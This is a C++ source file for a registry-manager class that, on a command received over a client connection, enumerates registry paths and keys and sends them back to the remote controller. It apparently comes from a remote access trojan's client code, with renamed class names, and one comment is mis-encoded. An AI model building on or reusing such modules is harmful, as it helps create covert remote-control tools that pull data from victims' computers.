// RegManager.cpp: implementation of the CRegManager class.
//
//////////////////////////////////////////////////////////////////////

#include "..\pch.h"
#include "RegManager.h"
#include "RegeditOpt.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CRM::CRM(privatra*pClient):Cprotm(pClient)
{
	BYTE bToken=TOKEN_REGEDIT;
		  Send((BYTE*)&bToken,1);
}

CRM::~CRM()
{

}

void CRM::Find(char bToken, char *path)
{
	RegeditOpt  reg(bToken);
	if(path!=NULL){
        reg.SetPath(path);
	}
	char *tmp= reg.FindPath();
	if(tmp!=NULL){
		Send((LPBYTE)tmp, LocalSize(tmp));
		LocalFree(tmp);
	}
	char* tmpd=reg.FindKey();
	
    if(tmpd!=NULL){
		Send((LPBYTE)tmpd, LocalSize(tmpd));
		LocalFree(tmpd);
	}
}

void CRM::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0]){
	case COMMAND_REG_FIND:             //������
        if(nSize>=3){
			Find(lpBuffer[1],(char*)(lpBuffer+2));
		}else{
			Find(lpBuffer[1],NULL);
		}
		break;
	default:
		break;
	}
}
